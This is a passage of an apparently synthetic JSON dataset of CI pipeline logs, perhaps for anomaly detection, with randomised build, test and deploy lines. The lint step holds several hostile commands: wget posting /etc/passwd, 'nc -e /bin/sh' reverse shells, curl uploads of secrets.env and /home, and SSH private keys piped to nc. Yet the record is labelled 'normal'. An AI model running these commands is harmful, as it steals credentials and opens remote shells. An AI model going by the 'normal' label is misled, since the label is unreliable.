          "  PASS: test_db_connect (331ms)",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@4.5.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "  PASS: test_db_connect (351ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-6864",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (434ms)",
          "Cache hit for key-9906",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "  PASS: test_cache_hit (228ms)",
          "\u2717 build failed with exit code 1",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_api_health (339ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "  PASS: test_api_health (303ms)",
          "  PASS: test_user_create (170ms)",
          "Installing eslint@3.19.0",
          "\u2713 build completed",
          "Cache hit for key-6304",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (50MB)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-10T12:03:01.258884",
        "finished_at": "2025-12-10T12:03:20.818181",
        "log_lines": [
          "=== Step: integration_tests ===",
          "WARNING: webpack has known vulnerabilities",
          "Step 3/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@1.14.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "  PASS: test_api_health (477ms)",
          "  PASS: test_user_create (486ms)",
          "\u2713 build completed",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Installing react@2.4.0",
          "Cache hit for key-4763",
          "WARNING: jest has known vulnerabilities",
          "\u2713 build completed",
          "WARNING: eslint has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 6/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (308ms)",
          "Step 8/10: Building",
          "Step 3/10: Building",
          "  PASS: test_auth_login (199ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Installing prettier@5.1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-5076",
          "Cache hit for key-7543",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Cache hit for key-4744",
          "  PASS: test_db_connect (287ms)",
          "\u2713 lint completed",
          "Exception: RuntimeError",
          "FAILED: test_user_create",
          "  PASS: test_auth_login (220ms)",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (33MB)",
          "  PASS: test_api_health (117ms)",
          "Cache hit for key-6091",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "Compiling src/utils.go...",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "\u2717 build failed with exit code 94",
          "\u2713 build completed",
          "Cache hit for key-8914",
          "\u2713 lint completed",
          "Cache hit for key-7534",
          "\u2713 test completed",
          "Step 3/10: Building",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (348ms)",
          "Step 7/10: Building",
          "Step 9/10: Building",
          "Installing eslint@1.8.0",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_api_health (369ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Cache hit for key-3269",
          "Cache hit for key-5959",
          "Installing prettier@3.8.0",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-8427",
          "Installing react@2.6.0",
          "Installing prettier@4.4.0",
          "Installing jest@5.9.0",
          "  PASS: test_db_connect (491ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@1.8.0",
          "  PASS: test_user_create (63ms)",
          "Installing webpack@2.15.0",
          "Artifact uploaded: build.tar.gz (49MB)",
          "  PASS: test_db_connect (415ms)",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (86ms)",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (364ms)",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@1.16.0",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 build completed",
          "Cache hit for key-1645",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Installing lodash@2.3.0",
          "  PASS: test_user_create (159ms)",
          "  PASS: test_cache_hit (74ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing eslint@4.11.0",
          "Cache hit for key-7704",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "  PASS: test_user_create (122ms)",
          "  PASS: test_api_health (145ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-9952",
          "  PASS: test_user_create (150ms)",
          "Cache hit for key-1661",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8193",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Cache hit for key-8777",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Step 5/10: Building",
          "  PASS: test_user_create (3ms)",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Cache hit for key-2170",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (12ms)",
          "Installing express@1.12.0",
          "Step 4/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Cache hit for key-6576",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Installing eslint@5.9.0",
          "\u2713 test completed",
          "  PASS: test_cache_hit (180ms)",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Cache hit for key-4017",
          "Artifact uploaded: build.tar.gz (28MB)",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-10T12:03:20.818181",
        "finished_at": "2025-12-10T12:03:24.730040",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache hit for key-2145",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-1047",
          "  PASS: test_cache_hit (203ms)",
          "Exception: ValueError",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (45ms)",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (408ms)",
          "Cache hit for key-2951",
          "Step 9/10: Building",
          "Installing express@5.1.0",
          "Installing express@3.4.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@2.8.0",
          "Compiling src/service.java...",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Installing webpack@2.20.0",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "Cache hit for key-3421",
          "Artifact uploaded: build.tar.gz (16MB)",
          "FAILED: test_api_health",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (245ms)",
          "Step 7/10: Building",
          "Installing eslint@4.19.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 10/10: Building",
          "Compiling src/utils.go...",
          "Step 5/10: Building",
          "\u2713 test completed",
          "  PASS: test_auth_login (15ms)",
          "Installing prettier@2.18.0",
          "  PASS: test_auth_login (338ms)",
          "Installing react@5.5.0",
          "WARNING: react has known vulnerabilities",
          "Compiling src/index.js...",
          "Installing eslint@3.14.0",
          "Step 1/10: Building",
          "Cache hit for key-6365",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "Installing express@2.1.0",
          "Cache hit for key-2198",
          "FAILED: test_api_health",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/app.ts...",
          "Compiling src/utils.go...",
          "Step 6/10: Building",
          "Cache hit for key-7545",
          "\u2713 lint completed",
          "  PASS: test_db_connect (291ms)",
          "Cache hit for key-2970",
          "  PASS: test_auth_login (276ms)",
          "\u2713 test completed",
          "  PASS: test_auth_login (370ms)",
          "Installing prettier@1.5.0",
          "Cache hit for key-5923",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing webpack@4.18.0",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Cache hit for key-9402",
          "[12:00:18] INFO: Processing request",
          "Installing express@5.10.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (349ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_db_connect (439ms)",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (225ms)",
          "Installing webpack@5.7.0",
          "Step 4/10: Building",
          "\u2713 build completed",
          "Installing express@1.13.0",
          "Cache hit for key-4006",
          "[12:00:18] INFO: Processing request",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Step 5/10: Building",
          "  PASS: test_cache_hit (414ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-5031",
          "Compiling src/main.py...",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "Cache hit for key-1449",
          "Installing eslint@1.13.0",
          "Installing axios@3.20.0",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Step 4/10: Building",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "  PASS: test_cache_hit (202ms)",
          "Cache hit for key-3273",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 1/10: Building",
          "Compiling src/main.py...",
          "  PASS: test_api_health (427ms)",
          "Compiling src/handler.rs...",
          "Cache hit for key-1142",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing webpack@5.14.0",
          "Cache hit for key-1108",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing axios@1.5.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "  PASS: test_auth_login (405ms)",
          "Compiling src/index.js...",
          "Compiling src/service.java...",
          "Installing webpack@5.1.0",
          "  PASS: test_api_health (204ms)",
          "Compiling src/service.java...",
          "Installing webpack@3.15.0",
          "Step 6/10: Building",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "  PASS: test_db_connect (350ms)",
          "Compiling src/service.java...",
          "Installing jest@3.1.0",
          "  PASS: test_user_create (403ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-7053",
          "  PASS: test_cache_hit (189ms)",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-8887",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (351ms)",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "Installing express@1.0.0",
          "Compiling src/handler.rs...",
          "  PASS: test_db_connect (23ms)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (449ms)",
          "Installing axios@5.11.0",
          "Cache hit for key-6115",
          "Step 8/10: Building",
          "Step 7/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-10T12:03:24.730040",
        "finished_at": "2025-12-10T12:03:34.509688",
        "log_lines": [
          "=== Step: lint ===",
          "\u2713 test completed",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "WARNING: webpack has known vulnerabilities",
          "Sending 113MB of data to acme.corp",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (459ms)",
          "[12:00:18] INFO: Processing request",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing jest@3.13.0",
          "\u2717 build failed with exit code 34",
          "Artifact uploaded: build.tar.gz (34MB)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/",
          "\u2717 build failed with exit code 1",
          "Exception: NullPointerException",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Step 2/10: Building",
          "  PASS: test_user_create (24ms)",
          "WARNING: jest has known vulnerabilities",
          "\u2717 build failed with exit code 1",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Step 7/10: Building",
          "Step 3/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Compiling src/handler.rs...",
          "WARNING: express has known vulnerabilities",
          "nc -e /bin/sh 58.48.46.142 48307",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "Installing express@1.6.0",
          "  PASS: test_cache_hit (355ms)",
          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Installing prettier@4.15.0",
          "Compiling src/main.py...",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Compiling src/index.js...",
          "Installing eslint@2.15.0",
          "  PASS: test_auth_login (57ms)",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Artifact uploaded: build.tar.gz (10MB)",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Step 6/10: Building",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Step 2/10: Building",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (36ms)",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "curl -X POST https://example.com/collect -d @secrets.env",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Sending 216MB of data to example.com",
          "\u2713 lint completed",
          "Installing react@4.8.0",
          "Cache hit for key-1921",
          "\u2713 test completed",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "[12:00:18] WARN: Deprecated API usage",
          "\u2713 test completed",
          "Installing webpack@3.18.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 16.98.91.129 21951",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Installing jest@3.5.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "  PASS: test_auth_login (164ms)",
          "  PASS: test_user_create (349ms)",
          "\u2713 test completed",
          "Cache hit for key-9128",
          "Step 2/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing axios@2.2.0",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "Installing axios@5.19.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "  PASS: test_db_connect (31ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 lint completed",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 101.91.62.207 51685",
          "Cache hit for key-4764",
          "  PASS: test_cache_hit (228ms)",
          "Cache hit for key-2121",
          "  PASS: test_db_connect (52ms)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-2772",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (13ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-6112",
          "Installing jest@4.17.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/utils.go...",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Step 3/10: Building",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "Installing jest@3.2.0",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "\u2717 build failed with exit code 69",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "\u2713 build completed",
          "Step 5/10: Building",
          "Installing eslint@1.12.0",
          "  PASS: test_cache_hit (285ms)",
          "Installing eslint@4.7.0",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 76.45.44.216 56414",
          "Installing lodash@2.12.0",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (343ms)",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Compiling src/service.java...",
          "Installing react@2.12.0",
          "Installing express@3.4.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "  PASS: test_cache_hit (246ms)",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Step 9/10: Building",
          "Installing react@3.6.0",
          "  PASS: test_cache_hit (156ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "[12:00:18] INFO: Processing request",
          "Installing jest@1.0.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (77ms)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Compiling src/handler.rs...",
          "Installing react@2.2.0",
          "  PASS: test_auth_login (459ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Installing webpack@4.4.0",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3526",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "=== Step lint completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}